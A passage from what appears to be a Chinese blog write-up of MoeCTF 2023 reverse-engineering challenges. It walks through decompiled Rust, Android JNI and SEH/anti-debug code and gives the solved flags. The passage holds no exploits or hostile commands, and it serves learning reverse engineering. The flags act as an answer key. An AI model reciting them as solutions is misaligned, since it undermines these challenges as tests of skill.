        <span class="token keyword">if</span> byte <span class="token operator">^</span> <span class="token number">0x88</span> <span class="token operator">!=</span> v34<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
            v38 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> v38 <span class="token punctuation">&#123;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Failure"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大概是这样的一个逻辑</p>
<p>得到flag moectf{Rust_rev_will_be_awfu1}</p>
<h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span><span class="token class-name">MainActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"长度不对哦"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">MainActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token class-name">Context</span> applicationContext <span class="token operator">=</span> <span class="token class-name">MainActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">,</span> <span class="token string">"OK!RIGHT,flag is moectf&#123;"</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span><span class="token class-name">MainActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Try to reverse the native lib!"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java">
<span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">int</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"ezandroid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>根据hint去查询资料了解到jni的代码存储在lib目录下的.so文件里面，然后在调用这些函数之前分动态注册和静态注册，静态注册的话搜索一个完整路径的类名就能找到代码位置，动态注册的话在注册的位置一路找到引用反编译就能找到位置</p>
<p>存在jni_onload就是动态注册</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">qword_3BF8 <span class="token operator">=</span> <span class="token function">sub_173C</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token string">"com/doctor3/ezandroid/MainActivity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> qword_3BF8 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">sub_1770</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> qword_3BF8<span class="token punctuation">,</span> off_2938<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
        v4 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span>
        v4 <span class="token operator">=</span> <span class="token number">65540</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个sub_1770应该是注册的函数，off_2938应该是要找的东西</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">                                        <span class="token punctuation">;</span> LOAD<span class="token operator">:</span><span class="token number">0000000000000168</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000002938</span> off_2938        DCQ aCheck              <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> JNI_OnLoad<span class="token operator">+</span><span class="token number">148</span>↑o
<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000002938</span>                                         <span class="token punctuation">;</span> <span class="token string">"check"</span>
<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000002940</span>                 DCQ aLjavaLangStrin     <span class="token punctuation">;</span> <span class="token string">"(Ljava/lang/String;)I"</span>
<span class="token punctuation">.</span>data<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>ro<span class="token operator">:</span><span class="token number">0000000000002948</span>                 DCQ sub_17B4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>能看到传参的类型 sub17B4就是check的实现</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">bool __fastcall <span class="token function">sub_D7C</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>inputString<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  _BYTE <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// x8</span>
  bool v3<span class="token punctuation">;</span> <span class="token comment">// [xsp+14h] [xbp-1Ch]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>flag<span class="token punctuation">;</span> <span class="token comment">// [xsp+18h] [xbp-18h]</span>
  _BOOL4 v6<span class="token punctuation">;</span> <span class="token comment">// [xsp+2Ch] [xbp-4h]</span>

  flag <span class="token operator">=</span> <span class="token operator">&amp;</span>asc_3B50<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">2</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>inputString <span class="token punctuation">)</span>
      v3 <span class="token operator">=</span> <span class="token operator">*</span>flag <span class="token operator">!=</span> <span class="token number">42</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v1 <span class="token operator">=</span> inputString<span class="token operator">++</span><span class="token punctuation">;</span>
      <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v1 <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token char">'a'</span><span class="token operator">:</span>
          <span class="token operator">--</span>flag<span class="token punctuation">;</span>
          <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token char">'d'</span><span class="token operator">:</span>
          <span class="token operator">++</span>flag<span class="token punctuation">;</span>
          <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token char">'s'</span><span class="token operator">:</span>
          flag <span class="token operator">+=</span> <span class="token number">15</span><span class="token punctuation">;</span>
          <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token char">'w'</span><span class="token operator">:</span>
          flag <span class="token operator">-=</span> <span class="token number">15</span><span class="token punctuation">;</span>
          <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token operator">:</span>
          v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      v6 <span class="token operator">=</span> <span class="token operator">*</span>flag <span class="token operator">==</span> <span class="token number">35</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v6<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ws应该是上下移的意思，可以知道迷宫的宽度为15</p>
<pre class="line-numbers language-none"><code class="language-none">***************
***@******#****
***.******.****
*...******.****
*.********.****
*.****.....****
*.****.********
*......********
***************<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>试了一下错了，重新看了一下，发现看的比较快 开头有个memcpy忽略了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">strcpy</span><span class="token punctuation">(</span>
  v7<span class="token punctuation">,</span>
  <span class="token string">"******************@**************.************...****#..*****.********.*****.****.....*****.****.*********......****"</span>
  <span class="token string">"*******************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v5 <span class="token operator">=</span> <span class="token function">__strlen_chk</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token number">0x88u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">__memcpy_chk</span><span class="token punctuation">(</span>asc_3B50<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> <span class="token number">136LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>asc_3B50就是看错的那个迷宫的地址</p>
<pre class="line-numbers language-none"><code class="language-none">***************
***@***********
***.***********
*...****#..****
*.********.****
*.****.....****
*.****.********
*......********
***********
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>moectf{ssaassssdddddwwddddwwaa}</p>
<h2 id="GUI-有问题"><a href="#GUI-有问题" class="headerlink" title="GUI [有问题]"></a>GUI [有问题]</h2><p>die显示是.net </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">WndClass<span class="token punctuation">.</span>lpfnWndProc <span class="token operator">=</span> sub_450CDF<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里设置了窗口过程的函数指针，他会处理窗口相关的信息</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">LRESULT __stdcall <span class="token function">sub_45BF90</span><span class="token punctuation">(</span>HWND hWndParent<span class="token punctuation">,</span> UINT Msg<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>hWbdParent是窗口的句柄，msg是消息的id，这个wparam和lparam好像是会根据消息的不同穿过来不同的附加消息。</p>
<p>关键是这里，这里是有个c++类，ida将这个类平坦开了，显示很奇怪，所以还是从汇编的视图去分析逻辑</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>wParam <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        DlgItem <span class="token operator">=</span> <span class="token function">GetDlgItem</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">GetWindowTextW</span><span class="token punctuation">(</span>DlgItem<span class="token punctuation">,</span> String<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sub_450C94</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token function">sub_450A0A</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v13<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token function">sub_450C94</span><span class="token punctuation">(</span>a91<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_4531AB</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token function">MessageBoxW</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> L<span class="token string">"hint"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
          <span class="token function">MessageBoxW</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> L<span class="token string">"Sorry, flag error."</span><span class="token punctuation">,</span> L<span class="token string">"hint"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sub_4529B8</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v13<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token function">sub_4529B8</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v13 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token function">sub_4529B8</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>从inputString开始分析，这里ecx看起来很奇怪，查询资料才知道这个ecx是一个this指针</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">push    eax             <span class="token punctuation">;</span> hWnd
call    ds<span class="token operator">:</span>GetWindowTextW
cmp     esi<span class="token punctuation">,</span> esp
call    j___RTC_CheckEsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c">lea     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>String<span class="token punctuation">]</span>
push    eax
lea     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_498<span class="token punctuation">]</span>
call    sub_450C94
mov     <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span>
lea     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_498<span class="token punctuation">]</span>
push    eax
lea     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4BC<span class="token punctuation">]</span>
push    ecx
call    sub_450A0A
add     esp<span class="token punctuation">,</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>







<h2 id="unwind"><a href="#unwind" class="headerlink" title="unwind"></a>unwind</h2><p>这个题一开始咱遇到挺多问题的，不过也学会 seh的程序怎么分析，哪些操作会出现异常被try块捕获 动态调试 一点点找反调试函数的方法。</p>
<p>一开始我就从静态上分析，先去学习了SEH大概是怎么样的一个东西，然后明白了SEH会对我分析程序运行顺序流程有影响，所以我需要关注什么汇编代码会出现异常，try块捕获后会跳转到哪里。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00415908</span> <span class="token punctuation">;</span>   __try <span class="token punctuation">&#123;</span> <span class="token comment">// __except at loc_415928</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00415908</span>                 mov     <span class="token punctuation">[</span>ebp<span class="token operator">+</span>ms_exc<span class="token punctuation">.</span>registration<span class="token punctuation">.</span>TryLevel<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041590F</span>                 mov     large dword ptr ds<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041590F</span> <span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span class="token comment">// starts at 415908</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00415919</span>                 mov     <span class="token punctuation">[</span>ebp<span class="token operator">+</span>ms_exc<span class="token punctuation">.</span>registration<span class="token punctuation">.</span>TryLevel<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0FFFF</span>FFFEh
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00415920</span>                 jmp     <span class="token keyword">short</span> loc_41597A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这是第一个try块，这里往ds:0 写数据是会触发一个异常的，查询资料后知道, ds:0是操作系统捕获空指针解引用的地址，这个地址是受保护的，写数据会触发异常</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411820</span> sub_411820      proc near               <span class="token punctuation">;</span> CODE XREF<span class="token operator">:</span> sub_4110FF↑j
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411820</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411820</span> var_E4          <span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">0E4</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411820</span> var_10          <span class="token operator">=</span> byte ptr <span class="token operator">-</span><span class="token number">10</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411820</span> var_C           <span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">0</span>Ch
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411820</span> var_4           <span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411820</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411820</span>                 push    ebp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411821</span>                 mov     ebp<span class="token punctuation">,</span> esp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411823</span>                 sub     esp<span class="token punctuation">,</span> <span class="token number">0</span>D0h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411829</span>                 push    ebx
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041182</span>A                 push    esi
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041182</span>B                 push    edi
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041182</span>C                 lea     edi<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_10<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041182F</span>                 mov     ecx<span class="token punctuation">,</span> <span class="token number">4</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411834</span>                 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span>CCCCCCCCh
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411839</span>                 rep stosd
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041183</span>B                 mov     eax<span class="token punctuation">,</span> ___security_cookie
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411840</span>                 xor     eax<span class="token punctuation">,</span> ebp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411842</span>                 mov     <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> eax
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411845</span>                 mov     <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_C<span class="token punctuation">]</span><span class="token punctuation">,</span> offset loc_4112FD
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041184</span>C                 push    <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_C<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041184F</span>                 push    large dword ptr fs<span class="token operator">:</span><span class="token number">0</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411856</span>                 mov     large fs<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span> esp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041185</span>D                 <span class="token keyword">int</span>     <span class="token number">3</span>               <span class="token punctuation">;</span> Trap to Debugger
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041185</span>E                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span><span class="token number">0E4</span>h<span class="token operator">+</span>var_E4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411861</span>                 mov     large fs<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span> eax
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411867</span>                 add     esp<span class="token punctuation">,</span> <span class="token number">8</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041186</span>A                 pop     edi
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041186</span>B                 pop     esi
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041186</span>C                 pop     ebx
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041186</span>D                 mov     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411870</span>                 xor     ecx<span class="token punctuation">,</span> ebp        <span class="token punctuation">;</span> StackCookie
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411872</span>                 call    j_@__security_check_cookie@<span class="token number">4</span> <span class="token punctuation">;</span> <span class="token function">__security_check_cookie</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411877</span>                 add     esp<span class="token punctuation">,</span> <span class="token number">0</span>D0h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041187</span>D                 cmp     ebp<span class="token punctuation">,</span> esp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041187F</span>                 call    j___RTC_CheckEsp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411884</span>                 mov     esp<span class="token punctuation">,</span> ebp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411886</span>                 pop     ebp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411887</span>                 retn
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00411887</span> sub_411820      endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第二个异常的位置就是在这里，int3是 x86里面的一个软中断指令，用来触发断点异常，调试器会用这个int3实现断点功能(这有个坑，关于动态调试的)</p>
<p>然后得出的逻辑是 inputString char[] 64这么一个数据 -&gt; 分成八个等长的子串 -&gt;前四个使用tea1和key[]数组加密-&gt;后四个使用tea2和key[]数组加密-&gt; cmp inputString flagString -&gt; jz flag success</p>
<p>大概是这么一个逻辑</p>
<p>遇到的第一个问题是，这个tea1和tea2其实是一个东西，call的时候咱没看清楚函数名字(反编译插件显示有些问题，就去跟着两个tea encode写了一遍代码qaq 。不过发现在分析算法的时候，一开始总点关注对输入输出是怎么样的一个处理流程，然后再给偏移地址全部打上标签，然后就能很快分析清楚了qaq)</p>
<p>然后写了decode之后怎么解都是只能解出前半段，看来看去逻辑都没有问题，调试的话就会莫名其妙的闪退</p>
<p>从main开始往下单步会发现</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041589</span>A                 call    j_@__CheckForDebuggerJustMyCode@<span class="token number">4</span> <span class="token punctuation">;</span> <span class="token function">__CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0041589F</span>                 call    sub_4113E3
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004158</span>A4                 mov     esi<span class="token punctuation">,</span> esp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">004158</span>A6                 push    offset Buffer   <span class="token punctuation">;</span> <span class="token string">"Welcome to moectf2023!!! Now you find Y"</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行到4113E3就会闪退，跟进去看一下</p>
